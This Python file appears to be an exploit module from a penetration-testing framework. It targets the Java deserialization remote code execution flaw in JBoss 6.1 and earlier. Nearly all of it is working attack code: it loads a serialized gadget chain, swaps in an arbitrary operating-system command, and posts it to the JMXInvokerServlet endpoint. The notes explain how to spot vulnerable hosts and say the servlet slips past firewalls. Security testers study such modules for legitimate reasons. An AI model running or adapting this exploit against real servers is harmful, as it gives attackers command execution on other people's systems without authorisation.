#!/usr/bin/env python
# specified in LICENSE.txt in your Agora distribution

import urllib2
import os
from Sploit import Sploit
from core.helpers.java.Serialization import Stream
from collections import OrderedDict

INFO = {}
INFO['NAME'] = "ef_jboss_java_serialization_rce"
INFO['DESCRIPTION'] = "jBoss(version <= 6.1) Java Deserialization Vulnerability"
INFO['VENDOR'] = "http://www.jboss.org/"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
    JBoss can run on any port, but the default install runs on port 8080. JMXInvokerServlet sits at the URI path http://host/invoker/JMXInvokerServlet.
If you visit it in a web browser, it will actually send you a raw Java object back, a pretty good indication that it's going to be vulnerable.
Since the JMXInvokerServlet runs on the same port as the main web application, it wont be blocked by a firewall.
jBoss contains vulnerable libraries "commons-collections-3.2.jar. You can post arbitrary serialized java object to http://host/invoker/JMXInvokerServlet and it will be executed"
    """
INFO["DOWNLOAD_LINK"] = "http://olex.openlogic.com/package_versions/10394/download?package_version_id=6132&path=https%3A%2F%2Folex-secure.openlogic.com%2Fcontent%2Fopenlogic%2Fjboss%2F6.1.0.Final%2Fopenlogic-jboss-6.1.0.Final-all-bin-Everything-1.zip"
INFO["LINKS"] = ["http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/",
                 "https://github.com/frohoff/ysoserial"]
INFO['CHANGELOG'] = "15 Jan, 2016. Written by Gleg team."
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.114"
OPTIONS["PORT"] = "8080"
OPTIONS["VHOST"] = "/"
OPTIONS["COMMAND"] = "touch /tmp/pwned"


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.host = OPTIONS["HOST"]
        self.port = OPTIONS["PORT"]
        self.vhost = OPTIONS["VHOST"]
        self.command = OPTIONS["COMMAND"]
        self.url = ""

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", self.host).replace("/", "").replace("\\","")
        self.port = self.args.get("PORT", self.host)
        self.vhost = self.args.get("VHOST", self.vhost)
        self.vhost = self.vhost if self.vhost.startswith("/") else ("/" + self.vhost)
        self.command = self.args.get("COMMAND", self.command)
        self.url = "http://%s:%s%s" % (self.host, self.port, self.vhost)
        if not self.url.endswith("/"):
            self.url += "/"

    def set_payload(self):
        stream = Stream()
        handle = open(os.getcwd() + '/data/CVE-2015-8103/serialized_command_executor', 'rb')
        decoded = stream.decode(handle)
        handle.close()
        return self.set_command(decoded).encode()


    def set_command(self, decoded):
        command_class = decoded.references[45].class_data[0].values[0]
        command_class.contents = str(self.command)
        command_class.length = len(self.command)
        return decoded

    def run(self):
        #Get options from gui
        self.args()
        payload = self.set_payload()

        headers = {'Host': '192.168.1.114:8080',
                   'Content-Type': 'application/x-java-serialized-object;class=org.jboss.invocation.MarshalledValue',
                   'Content-Length': str('%s' % len(payload))
                   }
        print self.url + "/invoker/JMXInvokerServlet"
        request = urllib2.Request(str(self.url + "/invoker/JMXInvokerServlet"), data=payload, headers=headers)
        r = urllib2.urlopen(request)
        self.log("Payload was sent")
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
